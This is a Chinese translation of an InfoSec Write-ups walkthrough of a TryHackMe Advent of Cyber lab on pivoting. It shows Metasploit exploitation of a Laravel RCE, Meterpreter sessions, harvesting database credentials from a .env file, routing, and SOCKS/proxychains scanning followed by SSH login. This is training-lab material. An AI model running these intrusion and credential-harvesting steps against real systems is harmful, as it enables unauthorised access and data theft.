# 绕轴旋转

> 原文：<https://infosecwriteups.com/pivoting-253d65c6c867?source=collection_archive---------3----------------------->

## THM-2022 年赛博 4 的第 9 天来临

嘿，黑客，今天我将带你完成第九天的旋转任务。我们开始吧！

Docker:如果你看到存在一个文件:/。在根目录下的 dockerenv，那么就可以知道应用程序正在 docker 上运行。

这个房间是关于在一个叫做 Metasploit 的框架上交换模块的。Metasploit 利用对目标系统的初始访问。有趣的是:它是免费的！

从给定机器上的 recon 开始，进行基本的 nmap 扫描:

![](img/3e56d8c23939f7863038a931ac05527b.png)

我们看到一个开放的端口 80，导航到我们看到它使用 laravel 的网页

查找 laravel 版本 8 的常见漏洞

![](img/5d9066e7ed21f05d3061aa71b01032ac.png)

目标机器使用的是 linux，apache server 的版本，所以我们可以使用远程代码执行。

通过在终端中键入“msfconsole”来启动 metasploit。

![](img/a720471d1916225a40be3aacc540fc1f.png)

在 vm 中设置 rhost(目标 ip)的值，lhost 为 tun0，在基于 web 的 kali 中设置 eth0

```
set rhosts <machine-ip>
set lhost tun0/eth0
check 
```

使用“运行”或“利用”运行利用漏洞。如果它不运行，输入“设置 ForceExploit 为真”

成功利用目标 ip 后，您可以获得您的用户的用户 id。这是一个不稳定的壳层，要得到一个稳定的壳层，我们需要一个叫做 meterpreter 的壳层，它在很多方面都很有用。您可以在当前用户上使用命令启动 meterpreter 会话:

```
sessions -u 1
and then run using:
sessions -i <session id of meterpreter>
```

![](img/90f2ebe4d3d8f2ef5fc7055d2eee6d6a.png)

我们找到了

接下来，让我们列出该用户下的根目录。

![](img/9e31b51c4f6468721d5ce6b96c377a00.png)

现在我们知道它在 docker 上运行，创建一个 shell。

的。/var/www 中的 env 文件是我们特别感兴趣的，因为它可能包含 datab

![](img/bb22eab1048cf2a0a0252e0e76abb550.png)

我们可以看到有一个数据库，用户名和密码是“postgres”耶！

使用“退出”退出 shell 模式。

因为我们不知道这个名为 webservice_database 的数据库主机的 ip 地址:

![](img/7a4132fe555e9de4b4e0a7887a8f4127.png)

记下来，我们需要这个。

现在，您可以尝试以下命令

```
ip a or ifconfig 
```

要查看 docker 容器所在机器的 ip 地址。

但是在这种情况下这些都不起作用，所以我们采用默认的“127.17.0.1”。

![](img/44df5b74983d6f753a2a1ff77d08ad28.png)

现在退出 shell，并在后台运行当前的 meterpreter 会话。

现在让我们搜索数据库漏洞:

auxiliary/scanner/postgres/postgres _ schema dump 是你接下来要使用的漏洞。

![](img/80f1c1e41b8464afcaa14f4126a5f094.png)

我们有一个名为 users 的表。

在我们继续之前，我们需要修改 metasploit 的内部*路由表。*

该路由表决定了通过何处发送网络流量，例如，通过 Meterpreter 会话。通过这种方式，我们使用 Meterpreter 来进行 pivot:将流量发送到网络上的其他机器。

```
route add <IP/subnet> <meterpreter-session-id>
```

![](img/de4d128fc0dec191cf4bb195b741d9f8.png)

现在让我们使用 auxiliary/admin/postgres/postgres _ readfile:PostgreSQL Server 通用查询。

![](img/219a230e78e73b07ef05e39cbf2c750f.png)

运行这个，你会得到用户表和“圣诞老人”的密码，呀！

现在这完成了 metasploit 的基础，接下来是主要部分“旋转”。

socks 代理服务器:启动 SOCKS 代理服务器-> SOCKS 代理是一个中间服务器，支持在两台机器之间中继网络流量。

![](img/6869c969c9beb93f9ae6c14e685affe8.png)

srvport 是 1080

现在，您可以使用 socks 代理向 docker 发送请求。像`curl`这样的工具支持通过 socks 代理服务器经由`--proxy`标志发送请求:

```
curl --proxy socks5://127.0.0.1:1080 http://172.17.0.1
```

现在/etc 文件夹中有一个名为 proxychains4.conf 的文件，打开它并编辑内容

![](img/8b649263b492def160562c59b5e20f66.png)

现在，如果该工具本身不支持使用 socks 代理的选项，ProxyChains 可以截获该工具打开新网络连接的请求，并通过 socks 代理路由该请求。

```
proxychains curl http://127.17.0.1  //strict chain 127.0.0.1:1080  ...  172.17.0.1:80
```

这意味着我们可以访问 docker 应用程序。让我们运行一次 nmap 扫描，看看哪些端口是打开的:

```
proxychains nmap -F -sT -Pn 172.17.0.1
```

![](img/56e73d4bbf8c3a740adf0ad1c9439a5c.png)

我们看到 ssh 是开放的。

让我们回到 metasploit 并搜索 ssh。

```
run ssh://santa_username_here:santa_password_here@172.17.0.1
```

![](img/ba1fe4d3695a3f80d149c4aa029bf2df.png)

获取此的 meterpreter 会话并找到根标志:)

天哪，这对于一天来说太多了，但是我们发现了如何从一个应用程序转到另一个应用程序；)使用 socks proxy 和 proxychains 之类的工具。

还有其他的旋转方法，如果这个主题看起来很有趣，看看是什么！

继续黑！

## 来自 Infosec 的报道:Infosec 每天都有很多内容，很难跟上。[加入我们的每周简讯](https://weekly.infosecwriteups.com/)以 5 篇文章、4 个线程、3 个视频、2 个 GitHub Repos 和工具以及 1 个工作提醒的形式免费获取所有最新的 Infosec 趋势！